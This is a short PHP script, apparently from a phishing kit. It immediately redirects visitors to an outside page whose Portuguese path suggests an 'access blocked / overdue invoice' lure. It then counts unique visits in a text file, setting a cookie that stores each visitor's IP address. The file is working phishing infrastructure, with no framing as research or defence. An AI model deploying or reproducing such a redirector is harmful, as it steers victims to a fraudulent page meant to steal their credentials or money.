<?php ob_start(); ?>

<?php

$URLMALUCA  = "https://midregula.sslblindado.com/painel/bloqueio-acesso/inadimplencia/fatura/";


header("Location: $URLMALUCA");


session_start();

$arquivo = "read.txt";

$valor = 1;               // Valor agregado por visita

$timer = time()+3600;      // Dura?ao do cookie para contar o mesmo ip (3600s = 1h)

$id = fopen($arquivo, "r+");

$conteudo = fread($id,filesize($arquivo));

fclose($id);

    if($_COOKIE['NotCont']=='') {

        $conteudo += $valor;

        $id = fopen($arquivo, "r+");

        fwrite($id, $conteudo, strlen($conteudo));

        fclose($id);

        SetCookie("NotCont",$_SERVER['REMOTE_ADDR'],$timer);

    } else {

        SetCookie("NotCont",$_SERVER['REMOTE_ADDR'],$timer);

    }

exit();

?>